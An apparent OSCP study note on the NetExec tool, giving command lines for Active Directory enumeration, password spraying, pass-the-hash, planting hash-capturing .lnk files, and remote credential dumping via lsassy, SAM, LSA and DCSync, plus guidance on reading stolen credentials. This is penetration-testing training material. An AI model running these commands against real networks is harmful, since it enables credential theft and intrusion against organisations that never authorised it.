---
title: "NetExec"
slug: netexec
category: notes
handbook: oscp
tags: ["active-directory"]
draft: false
pubDatetime: 2026-08-01T10:35:17+03:00
modDatetime: 2026-09-09T21:52:45+03:00
description: "NetExec is the maintained successor to CrackMapExec (CME), which was abandoned in 2023; the community forked it and renamed the binary `nxc`."
---
NetExec is the maintained successor to CrackMapExec (CME), which was abandoned in 2023; the community forked it and renamed the binary `nxc`. It is the workhorse for network and Active Directory work from Kali: one command sweeps many hosts, authenticates over a chosen protocol, and runs modules for shares, users, sessions, credential dumping, and the common AD attacks. It replaces a stack of separate scripts and is central to [Active Directory Enumeration](/collections/oscp/active-directory-enumeration), [Password Spraying](/collections/oscp/password-spraying), [AS-REP Roasting](/collections/oscp/as-rep-roasting), and [Kerberoasting](/collections/oscp/kerberoasting).

## Install

```bash
sudo apt install -y netexec     # binary is nxc; older systems still ship crackmapexec
```

## Shape

Protocol first, then targets, then auth and modules:

```bash
nxc <protocol> <target(s)> -u <user> -p <pass> [modules]
```

Protocols include `smb`, `ldap`, `winrm`, `mssql`, `rdp`, `ssh`, `ftp`. Targets can be one IP, several, a range, or a CIDR. Output marks each result: `[+]` success, `[-]` failure, and `Pwn3d!` when the credential is local admin on that host, an immediate lateral-movement lead. The WinRM `Pwn3d!` can over-fire: on Medtech's CLIENT02 it flagged a user whom `net localgroup administrators` (run through the WinRM shell) showed was only in Remote Management Users. When SMB and WinRM admin verdicts disagree, believe the shell, not the marker.

## Authentication scope

Windows distinguishes a domain account from a local account even when the username is identical. NetExec may learn the domain from the target and show a qualified identity:

```
secura.yzx\administrator   # domain account
ERA\administrator           # local account on ERA
```

A failed domain attempt does not disprove the same password for a local account. Make the intended scope explicit:

```bash
nxc smb <DC_IP> -d <domain> -u user -p 'pass'              # domain account
nxc winrm TARGET -d <domain> -u user -p 'pass'          # domain account
nxc smb TARGET --local-auth -u user -p 'pass'           # local account
nxc winrm TARGET --local-auth -u user -p 'pass'         # local account
```

Use `--local-auth` when the credential came from the target's local SAM or a local configuration. With an ambiguous name such as `administrator`, test the domain and local scopes separately. `[-]` only reports that the selected scope rejected the attempt; it does not rule out the other scope.

## Enumeration (SMB)

```bash
nxc smb 10.10.10.0/24                         # sweep: hostnames, domain, OS, signing
nxc smb 10.10.10.5 10.10.10.6 10.10.10.7      # same sweep, space-separated IPs (good for filling /etc/hosts)
nxc smb <DC_IP> -u '' -p '' --shares             # shares over a null session
nxc smb <hosts> -u '' -p '' --rid-brute       # enumerate users by RID cycling
nxc smb <hosts> -u user -p pass --shares      # authenticated share listing
nxc smb <hosts> -u user -p pass --sessions --loggedon-users
```

Point domain-wide queries (RID cycling, LDAP, Kerberos) at the DC, because the DC holds the domain database and runs those services; the same query against a member server returns only that host's local accounts. Host-specific queries (`--shares`, `--sessions`, `--loggedon-users`) go against every host, since each has its own. In a multi-domain forest, each DC is authoritative for its own domain, so a child domain's users come from the child DC, not the root.

Two SMB modules pair with the relay workflow in [LLMNR Poisoning and NTLM Relay](/collections/oscp/llmnr-poisoning-and-ntlm-relay): `-M slinky -o SERVER=KALI NAME=foo` plants a hash-capturing .lnk into every writable share, and `--gen-relay-list targets.txt` writes a list of hosts with SMB signing off for `ntlmrelayx -tf`.

Turn a RID-brute dump straight into a clean `users.txt`, dropping machine and trust accounts (`HOST$`):

```bash
nxc smb <DC_IP> -u user -p pass --rid-brute \
  | grep SidTypeUser | grep -v '\$' | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
```

### Reading the SMB banner

The first `[*]` line for each host carries several fields worth reading:

- **signing:True/False** whether SMB signing is required. DCs require it (True) by default; member servers often do not (False). A host with signing:False is a target for SMB relay (ntlmrelayx); the DCs are not.
- **SMBv1:None** whether the legacy SMBv1 dialect is enabled. None or False means it is off (default since Server 2019), so MS17-010 EternalBlue does not apply and SMBv1-based tools like `smb-os-discovery` return nothing. True is a flag to check for it.
- **Null Auth:True** an anonymous session is allowed to connect. This is authentication only, not authorization. The session establishes (shown as `[+] domain\:` with an empty username), but reading shares, RID cycling, and LDAP searches each need permissions an anonymous session lacks on a hardened DC, so expect `STATUS_ACCESS_DENIED` on those even when Null Auth is True. A weakened domain is one where they actually return data.

## LDAP and AD attacks

```bash
nxc ldap <DC_IP> -u '' -p '' --users                        # user objects (needs anonymous read)
nxc ldap <DC_IP> -u user -p pass --asreproast asrep.out     # AS-REP roastable accounts
nxc ldap <DC_IP> -u user -p pass --kerberoasting kerb.out   # SPN accounts
nxc ldap <DC_IP> -u user -p pass --bloodhound -c All --dns-server <DC_IP>
```

## Spraying and credential reuse

One credential or hash tested across a host list is the core lateral-movement check. Respect the lockout policy when spraying passwords.

```bash
nxc smb <targets> -d <domain> -u users.txt -p 'Season2024!' --continue-on-success
nxc smb <targets> -u user -H <NTLM_hash>       # pass-the-hash
```

For a domain credential, use the domain scope and validate against the DC or domain member:

```bash
nxc smb <DC_IP> -d <domain> -u users.txt -p 'Season2024!' --continue-on-success
```

For local credentials, use `--local-auth` against each host. A password can fail as `DOMAIN\user` and still work as `HOST\user`; these are different account databases:

```bash
nxc smb TARGET --local-auth -u users.txt -p 'Season2024!' --continue-on-success
nxc winrm TARGET --local-auth -u users.txt -p 'Season2024!' --continue-on-success
```

## Dump credentials remotely

Local admin on a host (`Pwn3d!`) unlocks remote dumps with no shell required. Prefer these before dropping Mimikatz.

```bash
# live LSASS (logged-on users), first thing after Pwn3d!
nxc smb TARGET -u <admin> -p 'pass' -M lsassy
nxc smb TARGET -u <admin> -H <NTLM_hash> -M lsassy

# disk / registry secrets (no LSASS read)
nxc smb TARGET -u <admin> -H <NTLM_hash> --sam    # local SAM hashes
nxc smb TARGET -u <admin> -H <NTLM_hash> --lsa    # LSA secrets: service account passwords, cached domain logons
nxc smb <DC_IP>   -u <admin> -H <NTLM_hash> --ntds   # whole domain via DCSync (needs replication rights; point at the DC)
```

- **`-M lsassy`**: remote LSASS dump (what Mimikatz `sekurlsa::logonpasswords` does on-host). Yields NT hashes and sometimes plaintext for anyone with a session on that box. This is the usual "admin on workstation → next domain user" step. Why LSASS holds this: [Active Directory Concepts](/collections/oscp/active-directory-concepts#where-credentials-are-stored-sam-lsass-ntdsdit).
- **`--sam` / `--lsa` / `--ntds`**: read from disk or replication, not live LSASS, so they avoid the LSASS-access AV rule. A password works in place of `-H` on any of them.

### Reading lsassy output

Each line is one credential pulled from that host's memory. Shape is `DOMAIN\user` then either an NT hash (32 hex chars) or a cleartext password:

```
WKSTN01\Administrator   0123456789abcdef0123456789abcdef   # local account, NT hash → pass-the-hash on this host
corp.local\svc_web      <plaintext-password>              # domain account, plaintext → use -p everywhere
WKSTN01\svc_local       89ab...                            # local service account hash, often low value
```

- **Hostname as domain** (`WKSTN01\...`): local to that box. The Administrator hash is local admin on WKSTN01 only, not Domain Admin.
- **AD domain as domain** (`corp.local\...`, `hq.corp\...`): domain principal. Spray / shell with it on other hosts in that domain.
- **32-char hex** = NT hash → `-H <hash>` (no cracking needed for PTH).
- **Anything else** = plaintext password → `-p '...'`.
- Tickets lsassy saves under `~/.nxc/modules/lsassy` are pass-the-ticket material ([AD Lateral Movement](/collections/oscp/ad-lateral-movement)).

Pipe to a file; console scrolls. `tee lsassy-TARGET.txt` is enough. `--sam`/`--lsa`/`--ntds` also land under `~/.nxc/logs/`.

`--sam`/`--lsa`/`lsassy` go against any host the account is admin on; `--ntds` only against a DC.
